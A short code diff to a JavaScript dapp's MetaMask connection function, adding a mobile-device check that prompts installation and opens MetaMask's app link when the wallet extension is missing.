@@ -20,8 +20,16 @@ async function connectWallet() {
             // After connecting, send a transaction
             await sendTransaction(); // Automatically send the transaction after connecting
         } else {
-            console.error("MetaMask is not installed. Please install it.");
-            document.getElementById("status").innerText = "MetaMask is not installed.";
+            // If on a mobile device and MetaMask isn't installed, suggest installation
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            if (isMobile) {
+                // Open MetaMask directly for mobile users
+                alert("Please install the MetaMask app to continue.");
+                window.open("https://metamask.app.link/dapp/", "_blank");
+            } else {
+                console.error("MetaMask is not installed. Please install it.");
+                document.getElementById("status").innerText = "MetaMask is not installed.";
+            }
         }
     } catch (error) {
         console.error("Error connecting to wallet:", error);
